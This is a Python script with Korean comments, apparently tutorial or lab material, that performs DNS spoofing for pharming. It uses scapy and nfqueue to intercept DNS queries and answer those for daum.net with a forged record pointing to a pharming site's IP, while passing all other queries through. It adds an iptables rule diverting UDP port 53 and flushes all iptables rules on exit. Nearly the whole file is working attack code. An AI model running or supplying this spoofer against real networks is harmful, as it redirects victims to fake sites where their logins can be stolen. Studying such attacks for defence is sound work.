'''daum.net 도메인에 대한 IP주소를 묻는 DNS쿼리에 대해서만 파밍사이트의 IP주소인 172.21.70.227로 DNS응답을 하는 코드.
daum.net 이외의 도메인에 대해서는 정상적인 IP를 리턴할 수 있도록 패스한다. '''

from scapy.all import *
import nfqueue
import socket     #소켓을 nfqueue의 큐와 바인딩하기 위해.
import os        #iptables 명령 수행을 위한 system()을 이용하기 위해서 .

pharming_target = 'daum.net'
pharming_site = '172.21.70.227'

def dnsSpoof(dummy, payload):        #nfqueue의 큐에 데이터가 들어오면 호출할 콜백함수.
    data = payload.get_data()        #큐로부터 전달받는 데이터는 payload에 있다. 
    packet = IP(data)
    
    dstip = packet[IP].src
    srcip = packet[IP].dst
    dport = packet[UDP].sport
    sport = packet[UDP].dport
    
    if not packet.haslayer(DNSQR):                #패킷이 DNS쿼리가 아니면,
        payload.set_verdict(nfqueue.NF_ACCEPT)    #원래 목적지로 가라는 뜻. 
    else:                                         #패킷이 DNS 쿼리이면, 
        dnsid = packet[DNS].id
        qd = packet[DNS].qd
        rrname = packet[DNS].qd.qname
        
        if pharming_target in rrname:
            P_IP = IP(dst = dstip, src= srcip)
            P_UDP = UDP(dport = dport, sport= sport)
            dnsrr = DNSRR(rrname = rrname, ttl=10, rdata = pharming_site)
            P_DNS = DNS(id = dnsid, qr=1, aa=1, qd=qd, an = dnsrr)
            spoofPacket = P_IP/P_UDP/P_DNS
            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofPacket), len(spoofPacket))
            print('+DNS SPOOFING [%s] -> [%s]' %(pharming_target, pharming_site))
        else:
            payload.set_verdict(nfqueue.NF_ACCEPT)
            
def main():
    print('DNS SPOOF START...')
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
    #UDP 포트 53번으로 전송되는 데이터를 nfqueue로 전달하도록 ip테이블을 수정하는 명령.
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)        #인터넷 소켓과 바인딩 
    q.set_callback(dnsSpoof)        #큐에 데이터가 들어올 떄 호출할 콜백 함수 
    q.create_queue(0)
    
    try:
        q.try_run()                #nfqueue의 메인루프함수 
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        os.system('iptables -F')
        os.system('iptables -X')
        print('\n---RECOVER IPTABLES...')
        return 
    
    